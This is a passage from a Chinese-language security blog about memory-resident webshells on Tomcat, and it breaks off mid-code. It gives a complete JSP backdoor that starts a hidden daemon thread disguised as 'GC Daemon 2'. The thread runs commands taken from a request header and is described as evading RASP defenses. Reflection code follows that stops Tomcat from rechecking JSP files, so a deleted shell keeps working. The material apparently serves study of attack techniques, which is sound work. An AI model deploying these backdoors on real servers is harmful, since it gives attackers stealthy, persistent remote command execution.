<h3 id="线程型内存马"><a href="#线程型内存马" class="headerlink" title="线程型内存马"></a>线程型内存马</h3><p>根据以上的思考，可以发现，所谓的 Timer 型内存马，实际上就是想办法在服务器上启动一个永远不会被 GC 的线程，在此线程中定时或循环执行恶意代码，达到内存马的目的。</p>
<p>首先创建了一个独立于请求的线程，由这个线程里的动作用来实现恶意行为，这个线程里的行为不会自然终止，会持续运行直到 JVM 退出。</p>
<p>守护线程非常符合上述特征。新建线程的操作在攻击中有很多好处，其中之一就是可以绕过 RASP 类型的防御手段。</p>
<p>所以上面的 Timer 型内存马的关键代码可以修改为如下代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashSet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Object&gt; <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                    <span class="keyword">if</span> (!threadName.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                target = getField(getField(getField(target, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="type">List</span> <span class="variable">processors</span> <span class="operator">=</span> (List) getField(target, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> (Object processor : processors) &#123;</span><br><span class="line">                                target = getField(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line"></span><br><span class="line">                                threadName = (String) target.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, String.class).invoke(target, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;koishi&quot;</span>));</span><br><span class="line">                                <span class="keyword">if</span> (threadName != <span class="literal">null</span> &amp;&amp; !threadName.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">                                    <span class="type">Object</span>       <span class="variable">note</span> <span class="operator">=</span> target.getClass().getDeclaredMethod(<span class="string">&quot;getNote&quot;</span>, <span class="type">int</span>.class).invoke(target, <span class="number">1</span>);</span><br><span class="line">                                    <span class="type">Object</span>       <span class="variable">req</span>  <span class="operator">=</span> note.getClass().getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>).invoke(note);</span><br><span class="line">                                    List&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">                                    list.add(req);</span><br><span class="line">                                    list.add(threadName);</span><br><span class="line">                                    <span class="keyword">return</span> list;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getField</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (field == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(fieldName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新建线程，加入到 system 线程组中</span></span><br><span class="line">    <span class="type">Thread</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(getSystemThreadGroup(), <span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 死循环</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 恶意逻辑</span></span><br><span class="line">                    List&lt;Object&gt; list = getRequest();</span><br><span class="line">                    <span class="keyword">if</span> (list.size() == <span class="number">2</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!set.contains(list.get(<span class="number">0</span>))) &#123;</span><br><span class="line">                            set.add(list.get(<span class="number">0</span>));</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                Runtime.getRuntime().exec(list.get(<span class="number">1</span>).toString());</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// while true + sleep ，相当于 Timer 定时任务</span></span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 给线程起名叫 GC Daemon 2，没人会注意吧~</span></span><br><span class="line">    &#125;, <span class="string">&quot;GC Daemon 2&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设为守护线程</span></span><br><span class="line">    d.setDaemon(<span class="literal">true</span>);</span><br><span class="line">    d.start();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<p>可以看到，我这里是创建了一个守护线程，命名为 “GC Daemon 2”，然后把它直接放在了 system 线程组中，用来隐蔽自己。线程中是跟 Timer 型内存马一样的循环执行 request 中带入的命令的逻辑。</p>
<h2 id="十二、JSP型内存马"><a href="#十二、JSP型内存马" class="headerlink" title="十二、JSP型内存马"></a>十二、JSP型内存马</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10372" >JSP内存马研究 - 先知社区 (aliyun.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/224698" >Tomcat容器攻防笔记之JSP金蝉脱壳-安全客 - 安全资讯平台 (anquanke.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在上述 Timer 内存马的分析流程中，涉及到了 JSP 的处理流程。虽然现在知道 Timer 型内存马本身跟 JSP 没太大关系，但是还是发现了可以实现类似 Servlet-API 型内存马的新方式——也就是JSP型内存马。</p>
<p>jsp与之前我们讨论的 Servlet 型内存马类似，我们可以自己创建对应的类放在相应的位置。此处的重点在于如何绕过访问时的对于 JSP 状态一些判断。在Tomcat中<code>jsp</code>和<code>jspx</code>都会交给<code>JspServlet</code>处理，所以要想实现<code>JSP</code>驻留内存，首先得分析<code>JspServlet</code>的处理逻辑。</p>
<p><strong>jsp加载大致流程</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JspServlet#service 				//主要的功能是接收请求的URL，判断是否预编译 	-&gt; </span><br><span class="line">  JspServlet#serviceJspFile		//preCompile中当请求参数以jsp_precompile开始会进行预编译,默认情况下也不会预编译。 -&gt;</span><br><span class="line">  JspServletWrapper#service		//编译class，将其注册为servlet，调用servlet.servlet</span><br><span class="line">    Options#getDevelopment		//进行编译class</span><br><span class="line">      JspCompilationContext#compile	//判断是否需要编译，再去检查JSP文件是否存在，删除原有的java和Class文件</span><br><span class="line">    JspServletWrapper#getServlet()	//注册servlet</span><br><span class="line">    Servlet.service				//至此完成</span><br></pre></td></tr></table></figure></div>

<p><strong>说一下这个getServlet</strong></p>
<blockquote>
<p>首先判断<code>theServlet</code>是否为空，如果为空则表示还没有为JSP文件创建过Servlet，则通过<code>InstanceManager.newInstance</code>创建Servlet,并将创建的Servlet保存在<code>theServlet</code>属性中</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Servlet <span class="title function_">getServlet</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"><span class="comment">// getReloadInternal是否Reload默认为False，也就是说如果theServlet为true就会直接返回。</span></span><br><span class="line">        <span class="keyword">if</span> (getReloadInternal() || theServlet == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (getReloadInternal() || theServlet == <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="comment">//如果theServlet中有值则销毁该Servlet.</span></span><br><span class="line">                    destroy();</span><br><span class="line">                    <span class="keyword">final</span> Servlet servlet;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//创建Servlet实例</span></span><br><span class="line">                        <span class="type">InstanceManager</span> <span class="variable">instanceManager</span> <span class="operator">=</span> InstanceManagerFactory.getInstanceManager(config);</span><br><span class="line">                        servlet = (Servlet) instanceManager.newInstance(ctxt.getFQCN(), ctxt.getJspLoader());</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="type">Throwable</span> <span class="variable">t</span> <span class="operator">=</span> ExceptionUtils</span><br><span class="line">                                .unwrapInvocationTargetException(e);</span><br><span class="line">                        ExceptionUtils.handleThrowable(t);</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JasperException</span>(t);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="comment">//初始化servlet</span></span><br><span class="line">                    servlet.init(config);</span><br><span class="line">                    <span class="keyword">if</span> (theServlet != <span class="literal">null</span>) &#123;</span><br><span class="line">                        ctxt.getRuntimeContext().incrementJspReloadCount();</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="comment">//将servlet保存到theServlet中，theServlet由volatile修饰，在线程之间可以共享。</span></span><br><span class="line">                    theServlet = servlet;</span><br><span class="line">                    reload = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> theServlet;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<p>其中<code>theServlet</code>是由<code>volatile</code>修饰的，在不同的线程之间可以共享，再通过<code>synchronized (this)</code>加锁，也就是说无论我们请求多少次，无论是哪个线程处理，只要<code>this</code>是一个值，那么<code>theServlet</code>属性的值是一样的，而<code>this</code>就是当前的<code>jspServletWrapper</code>，我们访问不同的JSP也是由不同的<code>jspServletWrapper</code>处理的。</p>
</blockquote>
<p><strong>要想要完成内存驻留，我们要解决下面的问题。</strong></p>
<blockquote>
<ul>
<li>请求后不去检查JSP文件是否存在</li>
<li>theServlet中一直保存着我们的servlet，当我们请求对应url还能交给我们的servlet处理</li>
</ul>
</blockquote>
<p>第二个问题比较容易，<code>theServlet</code>能否获取到Servlet或者获取到哪个Servlet，是与<code>jspServletWrapper</code>是有关的，而在<code>JspServlet#serviceJspFile</code>中，如果我们已经将Servlet注册过，可以根据url从<code>JspRuntimeContext</code>中获取得到对应的<code>jspServletWrapper</code>。</p>
<p><del>感觉最近学的太多了，现在看这个东西，脑袋好像装满了，进不去啊，看的头大。。。。继续看吧</del></p>
<h3 id="请求后不去检查JSP文件是否存在"><a href="#请求后不去检查JSP文件是否存在" class="headerlink" title="请求后不去检查JSP文件是否存在"></a>请求后不去检查JSP文件是否存在</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>在参考文章中说到：</p>
<blockquote>
<p>默认Tomcat是以开发模式运行的。一般我们遇到的Tomcat都是以开发模式运行的，所以会由<code>JspCompilationContext#compile</code>进行编译。看下编译部分都做了什么，Tomcat默认使用<code>JDTCompiler</code>编译，首先通过<code>isOutDated</code>判断是否需要编译，再去检查JSP文件是否存在，删除原有的java和Class文件，通过<code>jspCompiler.compile()</code>编译。</p>
</blockquote>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (options.getDevelopment() || mustCompile) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                    <span class="comment">// 这里检测是否进行编译</span></span><br><span class="line">                    <span class="keyword">if</span> (options.getDevelopment() || mustCompile) &#123;</span><br><span class="line">                        ctxt.compile();</span><br><span class="line">                        mustCompile = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (compileException != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// Throw cached compilation exception</span></span><br><span class="line">                    <span class="keyword">throw</span> compileException;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">........................</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中涉及到的编译方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">compile</span><span class="params">()</span> <span class="keyword">throws</span> JasperException, FileNotFoundException &#123;</span><br><span class="line">      <span class="comment">//获取编译器，默认使用JDTCompiler编译</span></span><br><span class="line">        createCompiler();</span><br><span class="line">      <span class="comment">//通过isOutDated决定是否编译</span></span><br><span class="line">        <span class="keyword">if</span> (jspCompiler.isOutDated()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isRemoved()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FileNotFoundException</span>(jspUri);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//删除已经生成的java和Class文件</span></span><br><span class="line">                jspCompiler.removeGeneratedFiles();</span><br><span class="line">                jspLoader = <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">//编译</span></span><br><span class="line">                jspCompiler.compile();</span><br><span class="line">                jsw.setReload(<span class="literal">true</span>);</span><br><span class="line">                jsw.setCompilationException(<span class="literal">null</span>);</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<p>如果我们能让 <code>options.getDevelopment()</code> 返回false就不会进入<code>complie</code>部分。</p>
<p><code>development</code>并不是一个<code>static</code>属性，所以不能直接修改，要拿到<code>options</code>的对象。<code>options</code>对象被存储在<code>JspServlet</code>中</p>
<p>而<code>MappingData</code>中保存了路由匹配的结果,<code>MappingData</code>的<code>wrapper</code>字段包含处理请求的<code>wrapper</code>，在Tomcat中，<code>Wrapper</code>代表一个Servlet，它负责管理一个 Servlet，包括的 Servlet的装载、初始化、执行以及资源回收。在<code>Wrapper</code>的<code>instance</code>属性中保存着<code>servlet</code>的实例，因此我们可以从<code>MappingData</code>中拿到<code>JspServlet</code>进而更改<code>options</code>的<code>development</code>属性值</p>
<p>所以我们可以通过反射对<code>development</code>的属性修改</p>
<div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.mapper.MappingData&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.jasper.EmbeddedServletOptions&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//从request对象中获取request属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestF.get(request);</span><br><span class="line">    <span class="comment">//获取MappingData</span></span><br><span class="line">    <span class="type">MappingData</span> <span class="variable">mappingData</span> <span class="operator">=</span> req.getMappingData();</span><br><span class="line">    <span class="comment">//获取Wrapper</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">wrapperF</span> <span class="operator">=</span> mappingData.getClass().getDeclaredField(<span class="string">&quot;wrapper&quot;</span>);</span><br><span class="line">    wrapperF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) wrapperF.get(mappingData);</span><br><span class="line">    <span class="comment">//获取jspServlet对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">instanceF</span> <span class="operator">=</span> wrapper.getClass().getDeclaredField(<span class="string">&quot;instance&quot;</span>);</span><br><span class="line">    instanceF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">jspServlet</span> <span class="operator">=</span> (Servlet) instanceF.get(wrapper);</span><br><span class="line">    <span class="comment">//获取options中保存的对象 </span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Option</span> <span class="operator">=</span> jspServlet.getClass().getDeclaredField(<span class="string">&quot;options&quot;</span>);</span><br><span class="line">    Option.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">EmbeddedServletOptions</span> <span class="variable">op</span> <span class="operator">=</span> (EmbeddedServletOptions) Option.get(jspServlet);</span><br><span class="line">    <span class="comment">//设置development属性为false</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Developent</span> <span class="operator">=</span> op.getClass().getDeclaredField(<span class="string">&quot;development&quot;</span>);</span><br><span class="line">    Developent.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    Developent.set(op,<span class="literal">false</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>当我们第二次请求我们的脚本</strong><code>development</code><br><strong>的属性值已经被改为false,即使我们删除对应的</strong><code>jsp\java\Class</code><strong>文件，仍然还可以还可以正常请求shell。</strong></p>
<p><strong>但是如果我们想修改一个已经加载为</strong><code>Servlet</code> <strong>的JSP文件，即使修改了也不会生效。</strong></p>
<p>因加载一次后mustCompile为false 且我们修改了Development值为false，不再进行重新编译改写了</p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>在上面跟源码的时候，我们也能看见，在compile中，如果我们能让<code>isOutDated</code>返回false，也可以达到绕过的目的。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">compile</span><span class="params">()</span> <span class="keyword">throws</span> JasperException, FileNotFoundException &#123;</span><br><span class="line">        createCompiler();</span><br><span class="line">        <span class="keyword">if</span> (jspCompiler.isOutDated()) &#123;</span><br><span class="line">         ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>注意看下面的代码,在<code>isOutDated</code>中，当满足下面的条件则会返回false。<code>jsw</code>中保存的是<code>jspServletWarpper</code>对象，所以是不为null的，并且<code>modificationTestInterval</code>默认值是4也满足条件，所以我们现在要做的就是让<code>modificationTestInterval*1000</code>大于<code>System.currentTimeMillis()</code>,所以</p>
<p> <strong>只要将</strong><code>modificationTestInterval</code> <strong>修改为一个比较大的值也可以达到绕过的目的。</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isOutDated</span><span class="params">(<span class="type">boolean</span> checkClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (jsw != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; (ctxt.getOptions().getModificationTestInterval() &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (jsw.getLastModificationTest()</span><br><span class="line">                    + (ctxt.getOptions().getModificationTestInterval() * <span class="number">1000</span>) &gt; System.currentTimeMillis()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p><code>modificationTestInterval</code>也保存在<code>options</code>属性中，所以修改的方法和方法一类似。</p>
<div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.jasper.servlet.JspServletWrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.ConcurrentHashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span 